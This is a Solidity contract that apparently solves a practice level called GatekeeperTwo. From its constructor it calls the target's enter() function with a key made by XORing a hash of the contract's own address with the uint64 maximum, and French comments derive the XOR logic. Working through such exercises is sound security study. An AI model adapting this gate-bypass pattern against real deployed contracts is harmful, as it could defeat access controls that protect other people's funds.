// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

interface GatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract PassdGatekeeperTwo {
    address gatekeeperAddress = 0xd7cD0E57136446C7bc53bE1dFEa6208BD8274483;

    uint64 contractHash = uint64(bytes8(keccak256(abi.encodePacked(this))));
    uint64 key = contractHash ^ type(uint64).max;
    bytes8 gateKey = bytes8(key);

    // a ^ a ^ b = b
    // et
    // hash ^ key = max
    // donc
    // hash ^ hash ^ key = key
    // donc
    // hash ^ hash ^ key = hash ^ max
    // -> car : hash ^ key = max
    // donc au final
    // key = hash ^ max

    constructor() {
        GatekeeperTwo targetContract = GatekeeperTwo(gatekeeperAddress);
        require(targetContract.enter(gateKey), "failed");
    }
}
